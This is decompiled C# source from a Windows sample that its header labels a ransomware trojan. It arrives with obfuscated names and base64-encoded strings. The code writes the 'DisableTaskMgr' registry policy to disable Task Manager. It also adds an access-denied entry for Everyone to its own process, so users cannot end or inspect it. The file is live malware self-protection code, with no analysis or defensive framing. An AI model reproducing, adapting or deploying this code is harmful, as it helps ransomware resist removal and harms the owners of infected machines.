// Decompiled with JetBrains decompiler
// Type: kuMeqwHpurUBOD.TZgsKakdaVKQciq
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3332F4B9-4EB1-4ECC-A637-16FC36F853D6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-936a35ca214e9be1438c67a1153c854c28054994ce43f1eed39bb9dc52cb54dd.exe

using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace kuMeqwHpurUBOD
{
  internal class TZgsKakdaVKQciq
  {
    [DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
    private static extern bool HBoylJNcsH(
      IntPtr coflvSByMftf,
      int WqCsJRzVrC,
      [Out] byte[] whsEeguvVgc,
      uint WUkwlZRDvoEI,
      out uint QuUBhsnIaasI);

    [DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
    private static extern bool KfnBeVslYVtnF(
      IntPtr bVGYFEEazuajYOX,
      int YZxaVVdvdW,
      [In] byte[] UiPwgXBAGjR);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr gtpvzBFXHyS();

    public void gSbadMzFSeu([In] bool obj0)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"));
        if (obj0 && subKey.GetValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("RGlzYWJsZVRhc2tNZ3I=")) != null)
          subKey.DeleteValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("RGlzYWJsZVRhc2tNZ3I="));
        else
          subKey.SetValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("RGlzYWJsZVRhc2tNZ3I="), (object) "1");
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor zPtuFMZCIHx([In] IntPtr obj0)
    {
      byte[] whsEeguvVgc = new byte[0];
      uint QuUBhsnIaasI;
      TZgsKakdaVKQciq.HBoylJNcsH(obj0, 4, whsEeguvVgc, 0U, out QuUBhsnIaasI);
      if (QuUBhsnIaasI < 0U || QuUBhsnIaasI > (uint) short.MaxValue)
        return (RawSecurityDescriptor) null;
      byte[] binaryForm;
      return !TZgsKakdaVKQciq.HBoylJNcsH(obj0, 4, binaryForm = new byte[(IntPtr) QuUBhsnIaasI], QuUBhsnIaasI, out QuUBhsnIaasI) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0);
    }

    private void jVViNYodPxcMsQd([In] IntPtr obj0, [In] RawSecurityDescriptor obj1)
    {
      byte[] numArray = new byte[obj1.BinaryLength];
      obj1.GetBinaryForm(numArray, 0);
      TZgsKakdaVKQciq.KfnBeVslYVtnF(obj0, 4, numArray);
    }

    public void UYThlCsjAz()
    {
      try
      {
        IntPtr num = TZgsKakdaVKQciq.gtpvzBFXHyS();
        RawSecurityDescriptor securityDescriptor = this.zPtuFMZCIHx(num);
        securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        this.jVViNYodPxcMsQd(num, securityDescriptor);
      }
      catch (Exception ex)
      {
      }
    }
  }
}
